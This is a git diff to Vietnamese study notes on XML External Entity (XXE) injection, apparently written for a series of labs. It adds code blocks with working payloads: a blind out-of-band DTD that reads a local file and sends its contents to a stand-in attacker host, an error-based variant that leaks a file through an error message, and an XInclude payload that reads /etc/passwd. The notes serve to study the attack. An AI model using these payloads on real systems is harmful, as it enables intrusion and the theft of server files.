@@ -30,6 +30,12 @@ Một số ứng dụng sử dụng định dạng XML để truyền dữ liệ
     - VD: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`
 - Khai thác để lọc dữ liệu OOB (lab 5)
   - file độc hại trích xuất nội dung file đã cho
+    ```
+    <!ENTITY % file SYSTEM "file:///file_đã_cho">
+    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+    %eval;
+    %exfiltrate;
+    ```
     - Định nghĩa thực thể `file` chứa nội dung file đã cho: `<!ENTITY % file SYSTEM "file:///file_đã_cho">`
     - Định nghĩa thực thể `eval` chứa thực thể khác gọi là `exfiltrate` (thực thể sẽ được đánh giá bằng cách tạo 1 yêu  cầu HTTP tới máy chủ web tấn công chứa giá trị của `file` trong chuỗi truy vấn URL: `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">`
     - Sử dụng `eval` thực hiện khái báo `exfiltrate`: `%eval;`
@@ -38,6 +44,12 @@ Một số ứng dụng sử dụng định dạng XML để truyền dữ liệ
 "http://web-attacker.com/malicious.dtd"> %xxe;]>`
 
 - Khai thác để truy xuất dữ liệu qua các thông báo lỗi (lab 6)
+  ```
+  <!ENTITY % file SYSTEM "file:///file_đã_cho">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+  ```
   - Định nghĩa `file` chứa nội dung của file đã cho: `<!ENTITY % file SYSTEM "file:///file_đã_cho">`
   - Định nghĩa `eval` chứa `error` (được đánh giá bằng cách tải 1 tệp không tồn tại có chứa giá trị của `file`): `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
     
@@ -49,9 +61,10 @@ Một số ứng dụng sử dụng định dạng XML để truyền dữ liệ
     
   - tham chiếu tên và cung cấp đường dẫn đến tệp muốn đưa vào:
 
-      > `<foo xmlns:xi="http://www.w3.org/2001/XInclude">`
-      >
-      > `<xi:include parse="text" href="file:///etc/passwd"/></foo>`
+      ```
+      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+      <xi:include parse="text" href="file:///etc/passwd"/></foo>
+      ```
       
 - Thông qua upload file (lab 9)
   - Một số ứng dụng cho phép người dùng tải lên các tệp sau đó được xử lý phía máy chủ. Một số định dạng tệp phổ biến sử dụng XML hoặc chứa các thành phần phụ XML. Ví dụ về các định dạng dựa trên XML là các định dạng tài liệu văn phòng như DOCX và các định dạng hình ảnh như SVG.
